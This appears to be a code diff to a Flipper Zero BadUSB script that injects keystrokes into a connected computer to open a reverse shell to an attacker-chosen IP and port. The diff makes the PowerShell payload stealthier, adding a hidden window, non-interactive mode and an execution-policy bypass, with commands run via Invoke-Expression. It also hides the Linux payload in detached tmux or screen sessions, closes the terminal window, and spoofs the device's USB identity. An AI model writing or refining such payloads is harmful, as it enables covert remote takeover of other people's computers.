@@ -17,6 +17,7 @@
 let eventLoop = require("event_loop");
 let gui = require("gui");
 let submenuView = require("gui/submenu");
+let loadingView = require("gui/loading");
 let textInputView = require("gui/text_input");
 let badusb = require("badusb");
 let notify = require("notification");
@@ -87,6 +88,8 @@ let views = {
             "Send payload",
         ],
     }),
+
+    loading: loadingView.make(),
 };
 
 function updateOverview(views) {
@@ -120,7 +123,11 @@ eventLoop.subscribe(views.overView.chosen, function (_sub, index, gui, eventLoop
     } else if (index === 6) {
         gui.viewDispatcher.switchTo(views.openTerminal);
     } else if (index === 7) {
+        gui.viewDispatcher.switchTo(views.loading);
         startBadusb();
+        eventLoop.subscribe(eventLoop.timer("oneshot", 100), function (_sub, _, gui, views) {
+            gui.viewDispatcher.switchTo(views.overView);
+        }, gui, views);
     } 
 }, gui, eventLoop, views);
 
@@ -159,8 +166,10 @@ eventLoop.subscribe(views.operatingSystem.chosen, function (_sub, index, gui, ev
 
 eventLoop.subscribe(views.changeLayout.chosen, function (_sub, index, gui, eventLoop, views) {
     layout = layouts[index];
+    gui.viewDispatcher.switchTo(views.loading);
     badusb.quit();
     badusb.setup({vid: 0xAAAA,pid: 0xBBBB,mfrName: "Normal",prodName: "Device",layoutPath: "/ext/badusb/assets/layouts/" + layout + ".kl"});
+    gui.viewDispatcher.switchTo(views.overView);
     updateOverview(views);
 }, gui, eventLoop, views);
 
@@ -212,7 +221,7 @@ function startBadusb() {
         if (os === "Linux") {
             if (openTerminal === "Yes") {
                 badusb.press("CTRL", "ALT", "t");
-                delay(1000)
+                delay(1000);
             }
             let command = "";
             if (shellType === "bash") {
@@ -228,12 +237,12 @@ function startBadusb() {
             }
             if (hideActions === "Tmux") {
                 badusb.println("tmux new-session -d -s \"none\" \"" + command + "\"");
+                delay(500);
                 badusb.press("ALT", "F4");
-                delay(100);
             } else if (hideActions === "Screen") {
                 badusb.println("screen -dmS \"none\" " + command);
+                delay(500);
                 badusb.press("ALT", "F4");
-                delay(100);
             } else {
                 badusb.println(command);
             }
@@ -244,7 +253,7 @@ function startBadusb() {
             if (shellType === "powershell") {
                 if (openTerminal === "Yes") {
                     badusb.press("GUI", "x");
-                    delay(300);
+                    delay(500);
                     badusb.press("i");
                     delay(1000);
                 }
@@ -263,7 +272,7 @@ function startBadusb() {
                     badusb.press("ENTER");
                     delay(700);
                 }
-                badusb.println("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
+                badusb.println("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + ip + "', " + port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'flipper> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"")
             }
         }
     } else {
